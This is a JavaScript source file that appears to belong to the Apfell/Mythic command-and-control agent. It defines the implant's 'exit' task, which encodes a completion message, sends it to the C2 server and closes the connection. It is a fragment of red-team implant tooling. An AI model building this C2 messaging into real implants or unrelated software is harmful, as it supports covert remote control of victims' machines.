exports.exit = function(task) {
    try {
        let response = {"task_id":task.id, "user_output":"exiting", "completed": true};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        let meta = {
            "data": msg,
            "client": true,
            "tag":"",
        };
        let fullmsg = JSON.stringify(meta);
        connection.send(fullmsg);
        setTimeout(function name(params) {
            connection.close();
        }, C2.interval);
    } catch (error) {
        let response = {"task_id":task.id, "user_output":error.toString(), "completed": true, "status":"error"};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    }
};